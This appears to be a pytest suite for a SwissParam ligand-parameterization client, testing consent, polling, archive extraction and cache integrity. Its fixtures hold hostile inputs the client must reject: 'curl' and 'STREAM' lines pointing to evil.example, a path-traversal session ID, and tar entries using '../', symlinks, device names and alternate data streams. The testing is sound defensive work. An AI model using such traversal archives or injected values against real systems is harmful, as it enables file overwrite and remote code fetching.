from __future__ import annotations

import io
import json
import stat
import tarfile
from hashlib import sha256
from types import SimpleNamespace
from unittest import mock

import pytest

from core import swissparam_client as client

MOL2 = b"@<TRIPOS>MOLECULE\nTWB\n1 0\nSMALL\nUSER_CHARGES\n@<TRIPOS>ATOM\n1 H1 0 0 0 H 1 LIG 0\n"
START = b'Session number: 12345\nUse https://evil.example/next'
FINISHED = b'Your parameters:\nApproach: match\nCalculation is finished.\ncurl https://evil.example/next'


def archive_bytes(extra=(), omit=(), log=b"ligand Success!\n"):
    result = io.BytesIO()
    files = [(f"./ligand{ext}", b"fixture\n") for ext in (".rtf", ".par", ".prm", ".mol2", ".pdb")]
    files += [("./MATCH.log", log)]
    with tarfile.open(fileobj=result, mode="w:gz") as archive:
        for name, payload in files + list(extra):
            if name in omit:
                continue
            info = tarfile.TarInfo(name)
            if payload is None:
                info.type = tarfile.SYMTYPE
                info.linkname = "outside"
                archive.addfile(info)
            else:
                info.size = len(payload)
                archive.addfile(info, io.BytesIO(payload))
    return result.getvalue()


@pytest.fixture
def paths(tmp_path):
    source = tmp_path / "untrusted 'name.mol2"
    source.write_bytes(MOL2)
    return source, tmp_path / "cache"


def make_client(responses):
    transport = mock.Mock(side_effect=responses)
    service = client.SwissParamClient(transport=transport, sleep=mock.Mock(), monotonic=lambda: 0, max_polls=3)
    return service, transport


def test_upload_poll_retrieve_and_verified_offline_reuse(paths):
    source, cache = paths
    archive = archive_bytes()
    service, transport = make_client([START, b"Calculation is in the queue.", b"Calculation currently running.", FINISHED, archive])
    package = service.parameterize_match(source, cache, allow_upload=True)
    requests = [call.args[0] for call in transport.call_args_list]
    assert all(request.full_url.startswith(client.ENDPOINT + "/") for request in requests)
    assert requests[0].get_method() == "POST"
    assert MOL2 in requests[0].data
    assert b'filename="ligand.mol2"' in requests[0].data
    assert b'name="myMol2"' in requests[0].data
    provenance = json.loads((package / "provenance.json").read_text())
    assert provenance["input_sha256"] == sha256(MOL2).hexdigest()
    assert provenance["archive_sha256"] == sha256(archive).hexdigest()
    assert provenance["session"] == "12345"
    assert provenance["method"] == client.METHOD
    assert len(provenance["output_sha256"]) == 6
    transport.reset_mock(side_effect=True)
    transport.side_effect = AssertionError("offline cache must not access network")
    assert service.parameterize_match(source, cache, allow_upload=False) == package
    transport.assert_not_called()


def test_consent_required_before_any_network(paths):
    service, transport = make_client([])
    with pytest.raises(client.SwissParamError, match="consent"):
        service.parameterize_match(*paths, allow_upload=False)
    transport.assert_not_called()


def test_transient_failure_retains_session_and_resumes_without_resubmitting(paths):
    service, transport = make_client([START, OSError("offline")])
    with pytest.raises(client.SwissParamError, match="retry"):
        service.parameterize_match(*paths, allow_upload=True)
    sessions = list(paths[1].rglob("session.json"))
    assert len(sessions) == 1
    assert json.loads(sessions[0].read_text())["session"] == "12345"
    transport.reset_mock(side_effect=True)
    transport.side_effect = [FINISHED, archive_bytes()]
    service.parameterize_match(*paths, allow_upload=True)
    assert all(call.args[0].get_method() == "GET" for call in transport.call_args_list)


@pytest.mark.parametrize("status", [b"Calculation failed", b"Session expired", b"Surprise", b"Calculation is finished.\nError: typing failed"])
def test_failure_or_unknown_status_never_downloads(paths, status):
    service, transport = make_client([START, status])
    with pytest.raises(client.SwissParamError):
        service.parameterize_match(*paths, allow_upload=True)
    assert transport.call_count == 2


def test_bounded_polling_preserves_resumable_session(paths):
    service, transport = make_client([START] + [b"Calculation currently running."] * 3)
    with pytest.raises(client.SwissParamError, match="timed out"):
        service.parameterize_match(*paths, allow_upload=True)
    assert transport.call_count == 4
    assert list(paths[1].rglob("session.json"))


@pytest.mark.parametrize("entry", [
    ("../escape", b"x"), ("/absolute", b"x"), ("C:/escape", b"x"),
    ("dir\\escape", b"x"), ("link", None), ("./ligand.rtf", b"duplicate"),
    ("LIGAND.rtf", b"case alias"), ("CON", b"device"), ("ligand.rtf:stream", b"ADS"),
])
def test_unsafe_archives_never_publish_package(paths, entry):
    service, _ = make_client([START, FINISHED, archive_bytes(extra=[entry])])
    with pytest.raises(client.SwissParamError):
        service.parameterize_match(*paths, allow_upload=True)
    assert not list(paths[1].rglob("provenance.json"))


@pytest.mark.parametrize("archive", [archive_bytes(omit=["./ligand.rtf"]), archive_bytes(log=b"ligand Failed!"), b"not a tarball"])
def test_incomplete_or_failed_package_rejected(paths, archive):
    service, _ = make_client([START, FINISHED, archive])
    with pytest.raises(client.SwissParamError):
        service.parameterize_match(*paths, allow_upload=True)


@pytest.mark.parametrize("changed", ["ligand.rtf", "results.tar.gz", "extra.txt"])
def test_cache_tampering_fails_without_new_submission(paths, changed):
    service, transport = make_client([START, FINISHED, archive_bytes()])
    package = service.parameterize_match(*paths, allow_upload=True)
    target = package.parent / changed if changed == "results.tar.gz" else package / changed
    target.write_bytes(b"tampered")
    transport.reset_mock(side_effect=True)
    with pytest.raises(client.SwissParamError, match="integrity"):
        service.parameterize_match(*paths, allow_upload=True)
    transport.assert_not_called()


def test_download_size_bound_applies_to_injected_transport(paths, monkeypatch):
    monkeypatch.setattr(client, "MAX_ARCHIVE_BYTES", 4)
    service, _ = make_client([START, FINISHED, b"oversize"])
    with pytest.raises(client.SwissParamError, match="size limit"):
        service.parameterize_match(*paths, allow_upload=True)


def test_archive_member_count_bound(paths, monkeypatch):
    monkeypatch.setattr(client, "MAX_MEMBERS", 2)
    service, _ = make_client([START, FINISHED, archive_bytes()])
    with pytest.raises(client.SwissParamError, match="too many"):
        service.parameterize_match(*paths, allow_upload=True)


@pytest.mark.parametrize("payload", [b"", b"not MOL2", MOL2 + MOL2])
def test_invalid_input_never_uploads(paths, payload):
    paths[0].write_bytes(payload)
    service, transport = make_client([])
    with pytest.raises(client.SwissParamError, match="MOL2"):
        service.parameterize_match(*paths, allow_upload=True)
    transport.assert_not_called()


def test_invalid_session_cannot_control_request_url(paths):
    service, transport = make_client([b"Session number: 12/../../evil"])
    with pytest.raises(client.SwissParamError, match="session"):
        service.parameterize_match(*paths, allow_upload=True)
    assert transport.call_count == 1


def test_redirects_never_follow_service_or_cross_origin_targets():
    with pytest.raises(client.SwissParamError, match="redirected"):
        client._NoRedirect().redirect_request(None, None, 302, "Found", {}, "https://evil.example/")


def test_http_reader_has_timeout_and_reads_only_bound_plus_one():
    response = mock.MagicMock(status=200)
    response.read.return_value = b"payload"
    response.__enter__.return_value = response
    opener = mock.Mock()
    opener.open.return_value = response
    request = client.Request(client.ENDPOINT + "/checksession?sessionNumber=1")
    with mock.patch.object(client, "build_opener", return_value=opener):
        assert client._https(request, 17) == b"payload"
    opener.open.assert_called_once_with(request, timeout=30)
    response.read.assert_called_once_with(18)


@pytest.mark.parametrize("entry", [("Provenance.json", b"{}"), ("ligand.rtf/child.txt", b"x"), ("bad?name.txt", b"x")])
def test_reserved_paths_and_file_directory_conflicts_rejected(paths, entry):
    service, _ = make_client([START, FINISHED, archive_bytes(extra=[entry])])
    with pytest.raises(client.SwissParamError):
        service.parameterize_match(*paths, allow_upload=True)


@pytest.mark.parametrize("replacement", [b"[]", b"null", b'{"session":"12345"}'])
def test_invalid_saved_session_fails_without_network(paths, replacement):
    service, transport = make_client([START, OSError("offline")])
    with pytest.raises(client.SwissParamError):
        service.parameterize_match(*paths, allow_upload=True)
    next(paths[1].rglob("session.json")).write_bytes(replacement)
    transport.reset_mock(side_effect=True)
    with pytest.raises(client.SwissParamError, match="integrity"):
        service.parameterize_match(*paths, allow_upload=True)
    transport.assert_not_called()


def test_cache_output_cannot_be_changed_even_when_manifest_hash_is_rewritten(paths):
    service, _ = make_client([START, FINISHED, archive_bytes()])
    package = service.parameterize_match(*paths, allow_upload=True)
    (package / "ligand.rtf").write_bytes(b"changed")
    manifest = json.loads((package / "provenance.json").read_text())
    manifest["output_sha256"]["ligand.rtf"] = sha256(b"changed").hexdigest()
    (package / "provenance.json").write_text(json.dumps(manifest))
    with pytest.raises(client.SwissParamError, match="integrity"):
        service.parameterize_match(*paths, allow_upload=False)


def test_remote_directives_rejected():
    files = {f"ligand{suffix}": b"fixture" for suffix in client.REQUIRED_SUFFIXES}
    files.update({"MATCH.log": b"ligand Success!", "ligand.par": b"STREAM https://evil.example/payload\n"})
    with pytest.raises(client.SwissParamError, match="external directives"):
        client._validate_package(files)


def test_real_mol2_endpoint_shape_allows_absent_pdb_and_extra_tautomer_mol2(paths):
    archive = archive_bytes(omit=["./ligand.pdb"], extra=[("./ligand_t1.mol2", b"tautomer data")])
    service, _ = make_client([START, FINISHED, archive])
    package = service.parameterize_match(*paths, allow_upload=True)
    assert (package / "ligand.mol2").is_file()
    assert not (package / "ligand.pdb").exists()


def test_compressed_archive_expansion_is_bounded_before_tar_header_parsing(paths, monkeypatch):
    monkeypatch.setattr(client, "MAX_EXPANDED_BYTES", 1024)
    service, _ = make_client([START, FINISHED, archive_bytes()])
    with pytest.raises(client.SwissParamError, match="size limit"):
        service.parameterize_match(*paths, allow_upload=True)


@pytest.mark.parametrize("tag", [0x9000001A, 0x9000101A])
def test_cloud_reparse_files_are_not_links(tag):
    path = mock.Mock()
    path.lstat.return_value = SimpleNamespace(
        st_mode=stat.S_IFREG, st_file_attributes=0x400, st_reparse_tag=tag
    )
    assert not client._is_link(path)


@pytest.mark.parametrize("mode,tag", [
    (stat.S_IFREG, 0xA0000003),  # Windows junction.
    (stat.S_IFREG, 0xA000000C),  # Windows symbolic link.
    (stat.S_IFLNK, 0),  # POSIX symbolic link without Windows metadata.
])
def test_name_surrogate_reparse_points_and_symbolic_links_are_rejected(mode, tag):
    path = mock.Mock()
    path.lstat.return_value = SimpleNamespace(
        st_mode=mode, st_file_attributes=0x400 if tag else 0, st_reparse_tag=tag
    )
    assert client._is_link(path)
